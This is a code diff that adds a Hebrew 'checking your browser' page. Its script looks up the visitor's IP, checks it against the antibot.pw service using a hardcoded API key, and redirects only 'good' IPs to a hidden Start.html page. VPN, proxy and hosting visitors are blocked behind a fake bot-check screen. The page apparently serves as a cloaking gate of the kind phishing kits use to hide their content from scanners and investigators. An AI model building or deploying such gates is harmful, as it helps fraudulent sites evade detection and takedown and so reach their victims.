@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>בדיקת דפדפן...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #0b172a;
+            color: #ecf0f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .wrapper {
+            text-align: center;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 6px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #ffffff;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .title {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        .sub {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+    </style>
+    <script>
+        // JS-based IP check using antibot.pw (client-side approximation of the PHP check)
+        (function () {
+            var statusEl;
+
+            function setStatus(main, sub) {
+                try {
+                    if (!statusEl) {
+                        statusEl = document.querySelector('.sub');
+                    }
+                    var titleEl = document.querySelector('.title');
+                    if (titleEl && main) titleEl.textContent = main;
+                    if (statusEl && sub) statusEl.textContent = sub;
+                } catch (_) {}
+            }
+
+            // Always allow local development (127.0.0.1 / localhost) WITHOUT cookies
+            if (location.hostname === '127.0.0.1' || location.hostname === 'localhost') {
+                var localDelay = 500;
+                setTimeout(function () {
+                    window.location.href = './Start.html';
+                }, localDelay);
+                return;
+            }
+
+            // 1) Get client IP
+            fetch('https://api.ipify.org?format=json')
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    var ip = data && data.ip;
+                    if (!ip) {
+                        throw new Error('No IP');
+                    }
+
+                    // 2) Call antibot.pw API like the PHP version
+                    var apiKey = '49d1b63be75a9c08f88e40bf54f08401';
+                    var url = 'https://antibot.pw/api/v2-txt?ip=' + encodeURIComponent(ip) + '&key=' + encodeURIComponent(apiKey);
+
+                    return fetch(url);
+                })
+                .then(function (r) { return r.text(); })
+                .then(function (txt) {
+                    var result = (txt || '').trim();
+
+                    if (result === 'good') {
+                        // Human / allowed IP: continue to site (no cookies)
+                        var delay = 2000 + Math.floor(Math.random() * 2000);
+                        setTimeout(function () {
+                            window.location.href = './Start.html';
+                        }, delay);
+                    } else {
+                        // Blocked IP: do NOT redirect
+                        setStatus('הגישה נחסמה', 'כתובת ה-IP שלך זוהתה כ-VPN/Proxy/Hosting לפי antibot.pw.');
+                    }
+                })
+                .catch(function () {
+                    // On any error, fail closed (stay on this page)
+                    setStatus('שגיאה באימות', 'לא ניתן היה לאמת את החיבור שלך כרגע.');
+                });
+        })();
+    </script>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="spinner"></div>
+        <div class="title">בודק את הדפדפן שלך...</div>
+        <div class="sub">אנא המתן מספר שניות, אנו מאמתים שאינך רובוט.</div>
+    </div>
+</body>
+</html>
+
+
